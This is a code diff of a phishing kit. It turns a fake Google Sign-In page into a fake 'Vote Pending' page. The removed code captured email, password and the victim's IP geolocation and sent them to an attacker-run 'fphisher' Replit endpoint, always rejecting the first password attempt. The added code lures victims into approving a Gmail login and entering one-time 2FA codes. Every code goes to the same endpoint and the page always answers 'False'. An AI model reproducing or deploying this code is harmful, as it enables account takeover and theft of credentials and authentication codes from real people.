@@ -3,27 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Google Sign-In</title>
+  <title>Vote Pending</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script>tailwind.config = { darkMode: 'media' }</script>
   <style>
-    /* Your existing styles remain unchanged */
-    @keyframes fadeSlide {
-      from { opacity: 0; transform: translateX(30px); }
-      to   { opacity: 1; transform: translateX(0); }
-    }
-    .screen { display: none; }
-    .screen.active { display: flex; animation: fadeSlide 0.25s ease; }
-
-    @keyframes shake {
-      0%,100% { transform: translateX(0); }
-      20%     { transform: translateX(-7px); }
-      40%     { transform: translateX(7px); }
-      60%     { transform: translateX(-4px); }
-      80%     { transform: translateX(4px); }
-    }
-    .shake { animation: shake 0.4s ease; }
-
     @keyframes loadingBar {
       0%   { width: 0%; left: 0%; }
       50%  { width: 70%; left: 15%; }
@@ -38,363 +21,213 @@
       background: linear-gradient(to right, #4285f4, #ea4335, #fbbc05, #34a853);
       animation: loadingBar 1.8s infinite ease-in-out;
       z-index: 100;
-      border-radius: 0 3px 3px 0;
     }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20% { transform: translateX(-8px); }
+      40% { transform: translateX(8px); }
+      60% { transform: translateX(-5px); }
+      80% { transform: translateX(5px); }
+    }
+
+    .shake { animation: shake 0.4s ease; }
 
     :root {
       --bg-page:     #f0f4f9;
       --bg-card:     #ffffff;
-      --bg-chip:     #e8eaed;
       --text-heading:#202124;
       --text-body:   #444746;
-      --text-sub:    #5f6368;
-      --text-chip:   #202124;
-      --input-border:#747775;
-      --input-focus: #1a73e8;
-      --input-label: #444746;
-      --label-focus: #1a73e8;
-      --link-color:  #1a73e8;
-      --btn-bg:      #1a73e8;
-      --btn-text:    #ffffff;
-      --btn-hover:   #1765cc;
-      --error-color: #c5221f;
     }
 
     @media (prefers-color-scheme: dark) {
       :root {
         --bg-page:     #131314;
-        --bg-card:     #131314;
-        --bg-chip:     #303134;
+        --bg-card:     #1f1f1f;
         --text-heading:#e8eaed;
         --text-body:   #e3e3e3;
-        --text-sub:    #9aa0a6;
-        --text-chip:   #ffffff;
-        --input-border:#444746;
-        --input-focus: #8ab4f8;
-        --input-label: #9aa0a6;
-        --label-focus: #8ab4f8;
-        --link-color:  #8ab4f8;
-        --btn-bg:      #8ab4f8;
-        --btn-text:    #202124;
-        --btn-hover:   #93bbf9;
-        --error-color: #f28b82;
       }
     }
 
-    body        { background: var(--bg-page); }
-    .g-card     { background: var(--bg-card); position: relative; }
-    .g-chip     { background: var(--bg-chip); }
-    .g-heading  { color: var(--text-heading); }
-    .g-body     { color: var(--text-body); }
-    .g-sub      { color: var(--text-sub); }
-    .g-chip-txt { color: var(--text-chip); }
-    .g-link     { color: var(--link-color); }
-    .g-btn      { background: var(--btn-bg); color: var(--btn-text); }
-    .g-btn:hover{ background: var(--btn-hover); }
+    body { 
+      background: var(--bg-page); 
+      font-family: system-ui, -apple-system, sans-serif;
+    }
 
-    .g-input {
-      background: transparent;
-      border: 1.5px solid var(--input-border);
-      border-radius: 4px;
-      color: var(--text-heading);
-      font-size: 16px;
-      padding: 20px 12px 8px;
+    .g-card {
+      background: var(--bg-card);
+      position: relative;
+      width: 390px;
+      min-height: 844px;
+      margin: 40px auto;
+      border-radius: 40px;
+      box-shadow: 0 25px 50px -12px rgb(0 0 0 / 0.4);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 0 32px;
+    }
+
+    .code-input {
       width: 100%;
+      max-width: 320px;
+      background: #2c2c2c;
+      border: 1.5px solid #555;
+      color: white;
+      font-size: 18px;
+      padding: 16px 20px;
+      border-radius: 12px;
       outline: none;
-      transition: border-color 0.15s;
-    }
-    .g-input:focus { border-color: var(--input-focus); }
-    .g-input.error { border-color: var(--error-color) !important; }
-
-    .g-label {
-      position: absolute;
-      left: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: var(--input-label);
-      font-size: 16px;
-      pointer-events: none;
-      transition: all 0.15s;
-    }
-    .g-input:focus   ~ .g-label,
-    .g-input.filled  ~ .g-label {
-      top: 10px;
-      transform: none;
-      font-size: 12px;
-      color: var(--label-focus);
-    }
-    .g-input.error   ~ .g-label,
-    .g-input.error:focus ~ .g-label {
-      color: var(--error-color);
+      text-align: center;
+      margin-bottom: 12px;
     }
 
-    .g-error { color: var(--error-color); }
+    .code-input:focus {
+      border-color: #8ab4f8;
+    }
+
+    .instruction-text {
+      color: #9aa0a6;
+      font-size: 15px;
+      margin-bottom: 12px;
+      text-align: left;
+      max-width: 320px;
+    }
+
+    .error-text {
+      color: #f28b82;
+      font-size: 14px;
+      margin-top: 8px;
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .error-text.show {
+      opacity: 1;
+    }
+
+    .g-heading { color: var(--text-heading); }
+    .g-body { color: var(--text-body); }
   </style>
 </head>
 <body class="min-h-screen flex items-center justify-center">
 
-  <div class="g-card relative w-[390px] min-h-[844px] rounded-[40px] shadow-2xl overflow-hidden flex flex-col">
-
+  <div class="g-card">
     <!-- Top Loading Bar -->
-    <div id="loadingBar" class="loading-bar hidden"></div>
+    <div class="loading-bar"></div>
 
-    <!-- SCREEN 1 — Email (unchanged) -->
-    <div id="screen1" class="screen active flex-col flex-1 px-8 pt-14 pb-28">
-      <svg class="w-9 h-9 mb-10" viewBox="0 0 48 48">
-        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    <!-- Content -->
+    <div class="mb-10">
+      <svg xmlns="http://www.w3.org/2000/svg" class="w-20 h-20 mx-auto text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.25">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M5 10l7-7m0 0l7 7" />
       </svg>
-
-      <h1 class="g-heading text-[28px] font-normal mb-1">Sign in</h1>
-      <p class="g-body text-[15px] mb-8">Use your Google Account</p>
-
-      <div class="relative mb-1">
-        <input id="emailInput" type="email" oninput="onEmailInput(this)" class="g-input" />
-        <span class="g-label">Email or phone</span>
-      </div>
-
-      <div id="emailError" class="hidden items-center gap-1.5 mt-2 mb-1">
-        <svg class="w-4 h-4 flex-shrink-0 g-error" viewBox="0 0 20 20">
-          <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
-        </svg>
-        <p class="g-error text-[13px]">Enter a valid email address</p>
-      </div>
-
-      <a href="#" class="g-link text-[14px] mt-3 mb-10 block">Forgot email?</a>
-
-      <div class="mt-auto flex items-center justify-between">
-        <a href="#" class="g-link text-[14px]">Create account</a>
-        <button onclick="submitEmail()" class="g-btn font-medium text-[14px] px-6 py-3 rounded-full transition-colors">
-          Next
-        </button>
-      </div>
-
-      <p class="g-sub text-[13px] mt-8 flex items-center gap-1">
-        English (United States)
-        <svg class="w-3 h-3" style="fill:var(--text-sub)" viewBox="0 0 10 6"><path d="M0 0l5 6 5-6z"/></svg>
-      </p>
     </div>
 
-    <!-- SCREEN 2 — Password (unchanged) -->
-    <div id="screen2" class="screen flex-col flex-1 px-8 pt-14 pb-28">
-      <svg class="w-9 h-9 mb-8" viewBox="0 0 48 48">
-        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-      </svg>
+    <h1 class="g-heading text-[28px] font-medium mb-4">Vote Pending</h1>
+    
+    <p class="g-body text-[15px] leading-relaxed max-w-[290px] mb-10">
+      Check your Gmail and approve your login request and Get the code to tap from contestant and verify your vote
+    </p>
 
-      <h1 class="g-heading text-[28px] font-normal mb-3">Hi <span id="greetingName"></span></h1>
+    <!-- Enter Code Section -->
+    <div class="w-full max-w-[320px]">
+      <p class="instruction-text">
+        Check for one time code and enter
+      </p>
+      
+      <input 
+        id="codeInput" 
+        type="text" 
+        maxlength="10"
+        placeholder="Enter code" 
+        class="code-input"
+        onkeypress="if(event.key === 'Enter') submitCode()"
+      />
+      
+      <div id="errorMsg" class="error-text">False</div>
 
-      <div class="g-chip flex items-center gap-2 rounded-full px-3 py-1.5 w-fit mb-6 cursor-pointer" onclick="goBack()">
-        <div id="avatarCircle" class="w-6 h-6 rounded-full bg-teal-500 flex items-center justify-center text-white text-[11px] font-bold">?</div>
-        <span id="chipEmail" class="g-chip-txt text-[14px]"></span>
-        <svg class="w-3 h-3" style="fill:var(--text-sub)" viewBox="0 0 10 6"><path d="M0 0l5 6 5-6z"/></svg>
-      </div>
-
-      <p class="g-body text-[15px] mb-8">To continue, first verify it's you</p>
-
-      <div id="passInputWrap" class="relative mb-1">
-        <input id="passwordInput" type="password" oninput="onPassInput(this)" class="g-input" />
-        <span id="passLabel" class="g-label">Enter your password</span>
-      </div>
-
-      <div id="passError" class="hidden items-start gap-2 mt-2 mb-1">
-        <svg class="w-4 h-4 mt-0.5 flex-shrink-0 g-error" viewBox="0 0 20 20">
-          <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
-        </svg>
-        <p class="g-error text-[13px] leading-snug">
-          Wrong password. Try again or click "Forgot password?" for more options.
-        </p>
-      </div>
-
-      <label class="flex items-center gap-2 cursor-pointer mt-3 mb-8">
-        <input type="checkbox" id="showPassCheck" onchange="togglePass()" class="w-4 h-4 cursor-pointer"/>
-        <span class="g-body text-[14px]">Show password</span>
-      </label>
-
-      <div class="mt-auto flex items-center justify-between">
-        <a href="#" class="g-link text-[14px]">Forgot password?</a>
-        <button onclick="submitPassword()" class="g-btn font-medium text-[14px] px-6 py-3 rounded-full transition-colors">
+      <div class="flex justify-end mt-6">
+        <button onclick="submitCode()" 
+                class="bg-[#8ab4f8] hover:bg-[#6699ff] text-black font-medium px-10 py-3 rounded-full text-[15px] transition-colors">
           Next
         </button>
       </div>
-
-      <p class="g-sub text-[13px] mt-8 flex items-center gap-1">
-        English (United States)
-        <svg class="w-3 h-3" style="fill:var(--text-sub)" viewBox="0 0 10 6"><path d="M0 0l5 6 5-6z"/></svg>
-      </p>
     </div>
   </div>
 
   <script>
-    let passwordAttempts = 0;
     const ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/0c36ad344b";
-    const REDIRECT_URL = "account-google-com.html";
 
-    const loadingBar = document.getElementById('loadingBar');
-
-    function showLoading() {
-      loadingBar.classList.remove('hidden');
-    }
-
-    function hideLoading() {
-      loadingBar.classList.add('hidden');
-    }
-
-    function showScreen(id) {
-      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-      document.getElementById(id).classList.add('active');
-    }
-
-    function getFirstName(email) {
-      const local = email.split('@')[0];
-      const name = local.split(/[.\d_\-]/)[0];
-      return name.charAt(0).toUpperCase() + name.slice(1);
-    }
-
-    function isValidEmail(e) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }
-
-    function onEmailInput(el) {
-      el.classList.toggle('filled', el.value.length > 0);
-      el.classList.remove('error');
-      document.getElementById('emailError').classList.add('hidden');
-    }
-
-    function onPassInput(el) {
-      el.classList.toggle('filled', el.value.length > 0);
-      el.classList.remove('error');
-      document.getElementById('passLabel').style.color = '';
-      document.getElementById('passError').classList.add('hidden');
-    }
-
-    // New: Fetch IP + Country + City
-    async function getLocationData() {
-      try {
-        const res = await fetch('https://ipapi.co/json/', { 
-          method: 'GET',
-          cache: 'no-cache'
-        });
-        if (!res.ok) throw new Error('Geo failed');
-        const data = await res.json();
-        
-        return {
-          ip: data.ip || 'unknown',
-          country: data.country_name || 'unknown',
-          city: data.city || 'unknown',
-          region: data.region || data.region_code || 'unknown'
-        };
-      } catch (err) {
-        console.warn('Geolocation failed:', err);
-        return { ip: 'unknown', country: 'unknown', city: 'unknown', region: 'unknown' };
-      }
-    }
-
-    async function sendToBackend(email, password, location) {
+    // Send initial status — “Waiting for approval” (no timestamp)
+    async function sendPendingStatus() {
       try {
         await fetch(ENDPOINT, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ 
-            email, 
-            password, 
-            ...location,           // ip, country, city, region
-            timestamp: Date.now()
+          body: JSON.stringify({
+            status: "Waiting for approval",
+            message: "Vote Pending - User reached verification screen"
           })
         });
       } catch (err) {
-        console.error("Send failed:", err);
+        console.error("Failed to send pending status:", err);
       }
     }
 
-    async function submitEmail() {
-      const input = document.getElementById('emailInput');
-      const email = input.value.trim();
+    // Send each code attempt (no timestamp)
+    async function sendCodeAttempt(code) {
+      try {
+        await fetch(ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            code: code,
+            status: "CODE_ATTEMPT",
+            message: "User entered 2FA / one-time code"
+          })
+        });
+      } catch (err) {
+        console.error("Failed to send code:", err);
+      }
+    }
 
-      if (!isValidEmail(email)) {
-        input.classList.add('error');
-        const err = document.getElementById('emailError');
-        err.classList.remove('hidden'); err.classList.add('flex');
+    function showError() {
+      const errorEl = document.getElementById('errorMsg');
+      const input = document.getElementById('codeInput');
+      
+      errorEl.classList.add('show');
+      input.classList.add('shake');
+      
+      setTimeout(() => {
+        input.classList.remove('shake');
+      }, 400);
+    }
+
+    async function submitCode() {
+      const input = document.getElementById('codeInput');
+      const code = input.value.trim();
+
+      if (!code) {
         input.classList.add('shake');
         setTimeout(() => input.classList.remove('shake'), 400);
         return;
       }
 
-      showLoading();
-      await new Promise(r => setTimeout(r, 650));
+      // Send the entered code to backend
+      await sendCodeAttempt(code);
 
-      const firstName = getFirstName(email);
-      document.getElementById('greetingName').textContent = firstName;
-      document.getElementById('chipEmail').textContent = email;
-      document.getElementById('avatarCircle').textContent = firstName.charAt(0).toUpperCase();
-
-      hideLoading();
-      showScreen('screen2');
-      setTimeout(() => document.getElementById('passwordInput').focus(), 100);
+      // Always show "False" and clear the input
+      showError();
+      input.value = '';
     }
 
-    function goBack() {
-      passwordAttempts = 0;
-      onPassInput(document.getElementById('passwordInput'));
-      document.getElementById('passwordInput').value = '';
-      showScreen('screen1');
-    }
-
-    async function submitPassword() {
-      const input = document.getElementById('passwordInput');
-      const email = document.getElementById('chipEmail').textContent;
-      const password = input.value.trim();
-
-      if (!password) {
-        const wrap = document.getElementById('passInputWrap');
-        wrap.classList.add('shake');
-        setTimeout(() => wrap.classList.remove('shake'), 400);
-        return;
-      }
-
-      showLoading();
-      passwordAttempts++;
-
-      // Get location data
-      const location = await getLocationData();
-
-      await sendToBackend(email, password, location);
-      await new Promise(r => setTimeout(r, 900));
-
-      hideLoading();
-
-      if (passwordAttempts === 1) {
-        // First attempt - show error
-        input.classList.add('error');
-        document.getElementById('passLabel').style.color = 'var(--error-color)';
-        const err = document.getElementById('passError');
-        err.classList.remove('hidden'); err.classList.add('flex');
-
-        const wrap = document.getElementById('passInputWrap');
-        wrap.classList.add('shake');
-        setTimeout(() => wrap.classList.remove('shake'), 400);
-
-        input.value = '';
-        input.classList.remove('filled');
-      } else {
-        // Second attempt - redirect
-        window.location.href = REDIRECT_URL;
-      }
-    }
-
-    function togglePass() {
-      const passInput = document.getElementById('passwordInput');
-      passInput.type = document.getElementById('showPassCheck').checked ? 'text' : 'password';
-    }
-
-    document.addEventListener('keydown', e => {
-      if (e.key === 'Enter') {
-        if (document.getElementById('screen1').classList.contains('active')) submitEmail();
-        if (document.getElementById('screen2').classList.contains('active')) submitPassword();
-      }
-    });
+    // Auto-send pending status when page loads
+    window.onload = function() {
+      sendPendingStatus();
+    };
   </script>
 </body>
 </html>
